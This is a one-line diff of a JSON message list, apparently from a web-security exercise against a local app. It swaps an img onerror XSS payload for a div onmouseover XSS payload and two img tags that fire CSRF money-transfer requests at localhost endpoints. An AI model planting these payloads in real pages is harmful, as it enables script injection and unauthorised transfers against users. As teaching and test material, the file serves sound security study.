@@ -1,1 +1,1 @@
-["abba","alla","awwa","<img src=\"bulbul\" onerror=\"alert(256)\" />","New Message"]
+["hey","<div onmouseover=\"alert(2222)\">ATTACKER MESSAGE</div>","<img src=\"http://localhost:3000/transferMoney?amountMoney=222&acountNumber=5\" />","<img src=\"http://localhost:3000/protectedTransferMoney?amountMoney=222&acountNumber=5\" />"]
